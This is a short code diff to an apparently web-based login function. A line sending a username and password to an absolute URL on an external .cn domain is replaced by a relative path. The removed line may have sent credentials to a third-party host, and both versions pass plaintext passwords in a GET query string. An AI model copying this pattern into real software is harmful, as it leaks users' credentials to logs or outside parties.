@@ -29,7 +29,7 @@ function postmessage() {
 		}
 	};
 
-	xmlhttp.open("GET", "https://www.compscosys.cn/files/bin/login-checkout.php?username="+username+"&password="+password, true);
+	xmlhttp.open("GET", "files/bin/login-checkout.php?username="+username+"&password="+password, true);
 	xmlhttp.send();
 
 }
